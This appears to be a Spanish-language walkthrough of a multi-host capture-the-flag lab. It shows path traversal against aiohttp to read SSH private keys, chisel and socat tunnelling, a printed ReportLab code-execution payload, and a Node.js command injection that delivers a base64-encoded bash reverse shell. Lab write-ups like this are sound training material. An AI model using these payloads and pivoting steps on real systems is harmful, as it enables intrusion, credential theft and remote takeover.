@@ -1,0 +1,567 @@
+# Enumeracion de Puertos, Seervicios y Versiones
+
+nmap -Pn -n -sS -p- -sV -sC --min-rate 5000 -vvv 10.10.10.2 -oN nmap
+
+22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.58
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+|_http-title: Did not follow redirect to http://grandma.dl/
+5000/tcp open  http    syn-ack ttl 64 aiohttp 3.9.1 (Python 3.12)
+| http-methods: 
+|_  Supported Methods: GET HEAD
+| http-title: Hospital - Calendar
+|_Requested resource was /static/index.html
+|_http-server-header: Python/3.12 aiohttp/3.9.1
+================================================================
+
+por ssh no hay mucho que hacer, es una version muy actualizada, asi que antes de chequear 
+el servicio web del puerto 80 voy agregar grandma.dl a /etc/hosts
+
+sudo echo '10.10.10.2 grandma.dl' >> /etc/hosts
+____________________________________________________________________________________
+Nota: cuidado en usar un solo > ya que borraria todo el contenido, deben usarse 2 >>
+____________________________________________________________________________________
+
+despues de chequear el puerto 80, nada funciona pero si observamos el reporte de nmap
+esta lanzando una version aiohttp 3.9.1 (Python 3.12) por el puerto 5000, asi que 
+despues de una busqueda en internet me consigo el siguiente exploit 
+https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh
+que tras analizarlo aplica un path traversal, por lo que interceptare una peticion
+con burpsuite en el servicio web del puerto 5000
+
+Peticion:
+___________________________________________________
+GET /static/index.html HTTP/1.1
+Host: 10.10.10.2:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+If-Modified-Since: Sun, 04 Aug 2024 08:46:46 GMT
+If-None-Match: "17e87a3074741c00-b5b"
+___________________________________________________
+
+ya por aqui estamos viendo los que es el static, asi que lo envio al repeter para enviar una
+peticion modificada:
+___________________________________________________
+GET /static/../../../../../etc/passwd HTTP/1.1
+Host: 10.10.10.2:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+If-Modified-Since: Sun, 04 Aug 2024 08:46:46 GMT
+If-None-Match: "17e87a3074741c00-b5b"
+___________________________________________________
+
+y obtenemos:
+___________________________________________________
+HTTP/1.1 200 OK
+Content-Type: application/octet-stream
+Etag: "17ea049d48c6ca00-4e1"
+Last-Modified: Fri, 09 Aug 2024 09:14:41 GMT
+Content-Length: 1249
+Accept-Ranges: bytes
+Date: Mon, 23 Sep 2024 22:55:32 GMT
+Server: Python/3.12 aiohttp/3.9.1
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
+sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
+drzunder:x:1001:1001:,,,:/home/drzunder:/bin/bash
+________________________________________________________
+
+intente lanzar un ataque al servicio ssh con el user drzunder
+pero no era posible, asi que intente alcanzar la llave privada
+id_rsa ssh del user drzunder y logre leerlas
+
+___________________________________________________
+GET /static/../../../../../home/drzunder/.ssh/id_rsa HTTP/1.1
+Host: 10.10.10.2:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+If-Modified-Since: Sun, 04 Aug 2024 08:46:46 GMT
+If-None-Match: "17e87a3074741c00-b5b"
+___________________________________________________
+
+despues de guardar la llave id_rsa le aplico permisos
+
+chmod og-wrx id_rsa
+ssh -i id_rsa drzunder@10.10.10.2
+
+# Maquina Gradman 1 User drzunder
+
+sudo -l
+-bash: sudo: command not found
+
+find / -perm -4000 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/newgrp
+
+cat IDdrzunder.txt
+fb34fd727314497e44d18b92dcb137d4 - DrZunder - Hostpital Grandma - Cardiology
+
+despues de un rato buscando en el sistema, no veo forma posible de una escalada, pero
+despues de chequear las interfaces, me consigo con una red mas...
+
+hostname -I
+10.10.10.2 20.20.20.2
+
+iba a pasarme un script para buscar host's activos pero esta maquina no tiene 
+casi nada instalado... asi que redireccionare puertos con chisel
+
+______________________________________________________________________________________________
+Desde mi maquina ataacante le enviare chisel y ejecutare chisel en mi maquina como server
+para luego ejecutarlo en gradman1 como cliente
+
+scp -i id_rsa chisel drzunder@10.10.10.2:/home/drzunder
+chisel server --reverse -p 90
+
+ahora desde Gradman1:
+
+./chisel client 10.10.10.1:90 R:3000:socks
+
+y se crea un tunel el cual agregare en /etc/proxychains4.conf
+
+sudo echo 'socks5  127.0.0.1 3000' >> /etc/proxychains4.conf
+_______________________________________________________________________________________________
+
+ahora me tocara ir testeando los host's a ver cual responde...
+
+el host 20.20.20.1 no responde, el 20.20.20.2 es Gradman1 y obtuve respuesta en 20.20.20.3
+
+proxychains4 nmap -sT -Pn 20.20.20.3 2>/dev/null 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-23 19:23 -04
+Nmap scan report for 20.20.20.3
+Host is up (0.00063s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+2222/tcp open  EtherNetIP-1
+9000/tcp open  cslistener
+
+proxychains4 curl http://20.20.20.3:2222 2>/dev/null
+sin respuesta
+
+proxychains4 curl http://20.20.20.3:9000 2>/dev/null
+aqui esta corriendo un servicio web
+
+proxychains4 firefox
+
+abro firerox directamente con proxychains4 y chequeo en http://20.20.20.3:9000
+donde me consigo con que puedo cargar archivos pero al intentar cargarme un php
+arroja el siguiente mensaje:
+__________________________________________________
+Bad Request
+Invalid file type. Only HTML files are allowed.
+__________________________________________________
+
+por lo que solo podria cargar archivos .html...
+asi que me creare un archivito .html para cargarlo y observar el comportamiento
+
+echo '<h1>Hola mundo</h1>' > index.html
+
+ahora me cargo el archivo y lo que observo es que me devuelve un archivo pdf, 
+analizando el pdf, me consigo lo siguiente:
+
+exiftool document-1.pdf            
+==============================================================================        
+ExifTool Version Number         : 12.76
+File Name                       : document-1.pdf
+Directory                       : .
+File Size                       : 1438 bytes
+File Modification Date/Time     : 2024:09:23 19:29:44-04:00
+File Access Date/Time           : 2024:09:23 19:29:46-04:00
+File Inode Change Date/Time     : 2024:09:23 19:30:49-04:00
+File Permissions                : -rw-rw-r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.4
+Linearized                      : No
+Author                          : (anonymous)
+Create Date                     : 2024:09:24 01:29:44-01:00
+Creator                         : (unspecified)
+Modify Date                     : 2024:09:24 01:29:44-01:00
+Producer                        : ReportLab PDF Library - www.reportlab.com
+Subject                         : (unspecified)
+Title                           : (anonymous)
+Trapped                         : False
+Page Mode                       : UseNone
+Page Count                      : 1
+===============================================================================
+
+los metadatos del pdf indican que se crea mediante ReportLab PDF Library - www.reportlab.com
+y ReportLab es una libreria de python que si buscamos en internet, resulta ser vulnerable,
+la informacion la obtuve desde aqui : https://github.com/c53elyas/CVE-2023-33733
+donde el payload que nos brindan es:
+
+<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
+                exploit
+</font></para>
+
+lo que hare sera enviarme una reverse shell, pero para eso tendre que consigurar socat en Gradman1 para que redirija el trafico 
+hasta mi maquina atacante donde estare en escucha por netcat...
+
+asi que primero me coloco en escucha por netcat en mi maquina atacante
+
+nc -lnvp 4444
+
+despues envio socat desde mi maquina hasta Gradman1
+
+scp -i id_rsa socat drzunder@10.10.10.2:/home/drzunder
+
+me vuelvo a conectar por ssh a Gradman1 y configuro socat
+
+ssh -i id_rsa drzunder@10.10.10.2
+./socat tcp-l:2000,fork,reuseaddr tcp:10.10.10.1:4444
+
+lo que socat reciba por el puerto 2000 lo va a redireccionar a
+mi maquina atacante hacia el puerto 4444 donde esta en escucha netcat
+______________________________________________________________________________
+
+ya configurado todo lo anterior, enviare el payload con la revershell en la 
+peticion por burpsuite hacia la maquina Gradman1 por el puerto 2000 que es donde 
+espera socat para redirigir a mi maquina atacante
+
+______________________________________________________________________________
+
+tuve que ir probando de diferentes formas el envio de la revershell porque
+con la tipica "/bin/bash -i >& /dev/tcp/20.20.20.2/2000 0>&1"
+no llegaba la conexion!! hasta que con telnet se pudo establecer la revershell
+
+# Maquina Gradman2 User app
+
+whoami
+app
+
+script /dev/null -c bash 
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+export TERM=xterm
+export SHELL=bash
+
+busco el id_rsa del user app y me creo una nueva llave privada en mi maquina
+atacante y le asigno los permisos necesarios para hacer la conexion...
+
+ahora desde mi maquina atacante me conecto a Gradman2 via ssh pasando por el tunel
+con proxychains4
+
+proxychains4 ssh -i id_rsa2 app@20.20.20.3 -p 2222
+hostname -I
+20.20.20.3 30.30.30.2 
+
+ya con la conexion via ssh a Gradman2 desde mi maquina atacante, voy a crear un nuevo
+tunel para llegar hasta la red 30.30.30.0/24, asi que envio chisel a Gradman2 desde
+mi maquina atacante:
+
+proxychains4 scp -P 2222 -i id_rsa2 chisel app@20.20.20.3:/home/app 2>/dev/null
+
+ahora nos volvemos a conectar a otra instancia hacia Gradman1 para volver a ejecutar socat,
+esta vez para que redireccione el trafico de chisel en Gradman2 hasta chisel en mi maquina
+y asi crear un nuevo tunel
+____________________________________________________________________________________________
+
+Ejecutamos socat en Gradman1:
+
+puerto donde estara recibiendo socat: 2250
+redireccion: 10.10.10.1:90
+
+./socat tcp-l:2250,fork,reuseaddr tcp:10.10.10.1:90
+
+____________________________________________________________________________________________ 
+
+Ejecutamos chisel en Gradman2 :
+
+en este caso, chisel enviara la conexion hasta socat en Gradman1
+
+ip:20.20.20.2
+puerto:2250 (donde espera socat)
+
+./chisel client 20.20.20.2:2250 R:3001:socks
+____________________________________________________________________________________________
+
+ahora si nos vamos a chisel server en nuestra maquina atacante, hemos recibido la conexion 
+y creado un segundo tunel
+
+2024/09/23 21:39:06 server: session#2: tun: proxy#R:127.0.0.1:3001=>socks: Listening
+
+este tunel vamos a agregarlo en /etc/proxychains4.conf
+
+aqui si vamos abrir /etc/proxychains4 porque debemos hacer un ajuste adicional el cual sera
+habilitar dynamic_chain y deshabilitar strict_chain, despues agregamos el nuevo tunel
+
+========================
+socks5  127.0.0.1 3000
+socks5  127.0.0.1 3001
+========================
+
+asi nos deben quedar los tuneles
+_______________________________________________________________________________________________
+
+ahora desde nuestra maquina atacante tenemos visibilidad hasta la red 30.30.30.0/24
+por lo que comenzare un con reconocimiento de host's y la ip 30.30.30.3 responde, pero
+los escaneos se realizan con mucha lentitud por lo que en /etc/proxychains4 deshabilitare 
+el tunel 3000 y solo dejare el 3001 (esto se hace comentando la linea del tunel 3000)
+Hora realiza nuevamente un escaneo con nmap
+
+proxychains4 nmap -sT -Pn -vvv 30.30.30.3 2>/dev/null
+
+Nmap scan report for 30.30.30.3
+Host is up, received user-set (0.089s latency).
+Scanned at 2024-09-23 21:57:40 -04 for 96s
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE      REASON
+2222/tcp open  EtherNetIP-1 syn-ack
+3000/tcp open  ppp          syn-ack
+
+
+proxychains4 nmap -p2222,3000 -sT -Pn -sV -sC -vvv 30.30.30.3 2>/dev/null
+
+PORT     STATE SERVICE REASON  VERSION
+2222/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 b6:bc:ae:74:f2:35:3d:06:a9:28:62:bb:01:df:46:36 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG/N7hOo7oW+3S+jWVrzRj6Fir/pP+wPB1r1VISx6A/GsxGkPdtv8UwGE950FczMoMf/loCmnz60S/cqGAaVFn0=
+|   256 08:a7:ef:c4:e7:e1:89:b7:59:23:cd:5f:19:2f:98:dd (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVWxLvxh8RkTA9LtaBU7mAMNlRobSDbdBTh5cb8+jzA
+3000/tcp open  http    syn-ack Node.js Express framework
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+==============================================================================================
+
+como en la maquina anterior, el puerto 2222 es ssh, pero el 3000 ahora es un servicio web
+pero si chequeamos el servicio web, nos conseguimos con una pagina totalmente en blanco,
+si revisamos el codigo fuente, esta en blanco, por lo que o realizo fuzzing o capturo una 
+peticion y chequeo lo que ocurre por detras...
+
+lo promero que hare es capturar una peticion
+
+=====================================================================
+GET / HTTP/1.1
+Host: 30.30.30.3:3000
+Cache-Control: max-age=0
+Accept-Language: en-US
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: profile=NzM0ODEzMDgtOTFlZi00ZDQ2LThkMTEtZGI4MWM2OTg3ZGY0
+If-None-Match: W/"0-2jmj7l5rSw0yVb/vlWAYkK/YBwk"
+Connection: keep-alive
+=====================================================================
+
+vuelvo a capturar otra peticion
+
+=====================================================================
+
+GET / HTTP/1.1
+Host: 30.30.30.3:3000
+Cache-Control: max-age=0
+Accept-Language: en-US
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: profile=NTY4MTNkZDMtYWE3NC00NDdlLWJkNWYtYzUwYWYzMTE3MDUy
+If-None-Match: W/"0-2jmj7l5rSw0yVb/vlWAYkK/YBwk"
+Connection: keep-alive
+======================================================================
+
+la cookie parece ser lo unico que cambia y parece codificada, asi que 
+vere si la puedo decodificar de base64
+
+echo 'NTY4MTNkZDMtYWE3NC00NDdlLWJkNWYtYzUwYWYzMTE3MDUy' |base64 -d
+56813dd3-aa74-447e-bd5f-c50af3117052
+
+echo 'NzM0ODEzMDgtOTFlZi00ZDQ2LThkMTEtZGI4MWM2OTg3ZGY0' |base64 -d
+73481308-91ef-4d46-8d11-db81c6987df4
+
+intente codificar comandos y ver si conseguia RCE pero no dio 
+resultados, con lo que si tuve resultados fue con path traversal
+y conseguir leer el archivo /etc/passwd 
+
+===================================================================
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
+node:x:1001:1001:,,,:/home/node:/bin/bash
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
+sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
+=======================================================================
+
+intente acceder al id_rsa del user node y logre leer la llave privada
+asi que copio la id_rsa y creo una nueva en mi maquina atacante, le
+asigno los permisos necesarios y me conecto via proxychains4-ssh
+
+proxychains4 ssh -i id_rsa3 node@30.30.30.3 -p 2222
+
+
+# Maquina Gradman3 User node
+
+en esta maquina tampoco podemos escalar a root, no tiene instalado ni siquiera 
+nano xd, lo que si tiene es una interfas de red mas!!!
+
+hostname -I
+30.30.30.3 40.40.40.2 
+
+por lo que creare un tunel mas hasta mi maquina atacante para llegarle a
+la red 40.40.40.0/24
+__________________________________________________________________________________
+
+tenemos que ejecutar chisel en la maquina Gradman3 y socat volver a ejecutarlo
+en Gradman1 y Gradman2 para que la conexion de chisel en Gradman3 llegue hasta 
+mi maquina atacante
+
+>>1) enviare chisel desde mi maquina hasta gradman3 y socat a Gradman2
+
+proxychains4 scp -P 2222 -i id_rsa2 socat app@20.20.20.3:/home/app
+proxychains4 scp -P 2222 -i id_rsa3 chisel node@30.30.30.3:/home/node 2>/dev/null
+
+
+>>2) socat en Gradman1 y Gradman2; chisel en Gradman3
+
+Gradman1 ejecuta socat, espera conexion por el puerto 2100 y reenvia a 10.10.10.1:90
+
+./socat tcp-l:2100,fork,reuseaddr tcp:10.10.10.1:90
+
+
+Gradman2 ejecuta socat, espera conexion por el puerto 8999 y reenvia a 20.20.20.2:2100
+
+./socat tcp-l:8999,fork,reuseaddr tcp:20.20.20.2:2100
+
+
+Gradman3 ejecuta chisel y envia la conexion a Gradman2 (socat) 30.30.30.2:8999
+
+./chisel client 30.30.30.2:8999 R:3002:socks
+==================================================================================================
+
+despues de realizar toda la conexion, chequeamos en el server chisel en nuestra maquina atacante y 
+tenemos el tunel que acabamos de crear
+
+2024/09/23 23:49:24 server: session#3: tun: proxy#R:127.0.0.1:3002=>socks: Listening
+
+lo agregamos a /etc/proxychains4.conf y podremos tener visibilidad hasta la red 40.40.40.0/24
+asi que realizamos un escaneo con nmap
+
+el host 40.40.40.1 no responde
+el host 40.40.40.2 es Gradman3
+y el host 40.40.40.3 responde pero el escaneo va muy lento...
+
+vuelvo a editar /etc/proxychains4.conf dejando solo habilitado el ultimo tunel que cree, el que corre
+por el puerto 3002
+
+vuelvo a lanzar el escaneo con nmap
+
+proxychains4 nmap -sT -Pn -n -vvv 40.40.40.3 2>/dev/null
+
+Nmap scan report for 40.40.40.3
+Host is up, received user-set (0.094s latency).
+Scanned at 2024-09-23 23:57:48 -04 for 101s
+Not shown: 999 closed tcp ports (conn-refused)
+PORT     STATE SERVICE REASON
+9999/tcp open  abyss   syn-ack
+
+proxychains4 curl http://40.40.40.3:9999 2>/dev/null    
+{"message":"Only POST available"}
+
+
+proxychains4 curl -X POST http://40.40.40.3:9999 2>/dev/null
+{"message":"POST request received","users":[{"id":1,"name":"DrZunder"},{"id":2,"name":"DrMario"},{"id":3,"name":"App"},{"id":4,"name":"Node"},{"id":"Error","name":"Command error"}]}
+
+por lo visto existe una mal deserializacion del json por lo que podriamos ejecutar comandos
+
+proxychains4 curl -X POST http://40.40.40.3:9999 -H "Content-Type: application/json" -d '{"id": "require(\"child_process\").execSync(\"whoami\").toString()"}' 2>/dev/null
+{"message":"POST request received","users":[{"id":1,"name":"DrZunder"},{"id":2,"name":"DrMario"},{"id":3,"name":"App"},{"id":4,"name":"Node"},{"id":"Error","name":"Command error"}],"result":"root\n"} 
+
+
+tenemos ejecucion de comandos y tambien como root, por lo que para enviar una revershell tendria que crear un tunel mas
+ejecutando socat en Gradman1, Gradman2 y Gradman3; en mi maquina estar en escucha con netcat y enviar socat a Gradman3
+
+maquina atacante
+scp -P 2222 -i id_rsa3 socat node@30.30.30.3:/home/node
+nc -lnvp 8888
+
+Gradman1
+./socat tcp-l:4300,fork,reuseaddr tcp:10.10.10.1:8888
+
+Gradman2
+./socat tcp-l:4301,fork,reuseaddr tcp:20.20.20.2:4300
+
+Gradman3
+./socat tcp-l:4302,fork,reuseaddr tcp:30.30.30.2:4301
+
+
+una vez que este todo lo anterior configurado, enviamos la revershell
+
+proxychains4 curl -X POST http://40.40.40.3:9999 -H "Content-Type: application/json" -d '{"id": "require(\"child_process\").execSync(\"echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQwLjQwLjQwLjIvNDMwMiAwPiYx'|base64 -d|bash\").toString()"}' 2>/dev/null
+
+ahora si chequeamos en netcat, hemos recibido la conexion consiguiendo el acceso como root directamente
+
+
+
+
+
+
+
+
+
